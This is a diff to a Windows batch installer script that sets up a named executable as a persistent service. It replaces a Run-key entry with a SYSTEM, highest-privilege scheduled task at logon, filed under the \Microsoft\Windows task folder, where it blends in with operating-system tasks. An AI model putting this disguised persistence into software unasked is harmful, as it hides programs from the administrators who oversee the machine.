@@ -26,10 +26,9 @@ rem Parse passed arguments to script
     set name=%~1
     if "%name%"=="" exit /b
     set dst_dir="%ALLUSERSPROFILE%\%name%"
-    reg ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v "%name%" /t REG_SZ /d %dst_dir%\%name%.exe /f 
-    schtasks /Create /F /RU System /RL HIGHEST /SC ONSTART /TN "%name%" /TR "%dst_dir%\%name%.exe" || schtasks /Create /RU System /SC ONSTART /TN "%name%" /TR "%dst_dir%\%name%.exe"
-    REM ping -4 -w 100 -n 1 spagent.capital.co && set loc=1 || set loc=0
-    REM if %loc%==0 del /F /Q "%dst_dir%\config.bin"
+    REM reg ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v "%name%" /t REG_SZ /d %dst_dir%\%name%.exe /f 
+    set task_root=\Microsoft\Windows\%name%
+    schtasks /Create /F /RU System /RL HIGHEST /SC ONLOGON /TN "%task_root%\%name%" /TR "%dst_dir%\%name%.bat"
     exit /b
     
 :uninstall
@@ -37,7 +36,9 @@ rem Parse passed arguments to script
     if "%name%"=="" exit /b
     set dst_dir="%ALLUSERSPROFILE%\%name%"
     call:stop %name%
+    set task_root=\Microsoft\Windows\%name%
     schtasks /DELETE /F /TN "%name%"
+    schtasks /DELETE /F /TN "%task_root%\%name%"
     reg delete HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v "%name%" /f
     rmdir /Q /S "%dst_dir%"
     exit /b
@@ -45,14 +46,17 @@ rem Parse passed arguments to script
 :stop
     set name=%~1
     if "%name%"=="" exit /b
+    set task_root=\Microsoft\Windows\%name%
     schtasks /END /TN "%name%"
+    schtasks /END /TN "%task_root%\%name%"
     taskkill /F /IM "%name%.exe"    
     exit /b
     
 :run
     set name=%~1
     if "%name%"=="" exit /b
-    schtasks /RUN /TN "%name%"      
+    set task_root=\Microsoft\Windows\%name%
+    schtasks /RUN /TN "%task_root%\%name%"
     exit /b
     
 :end
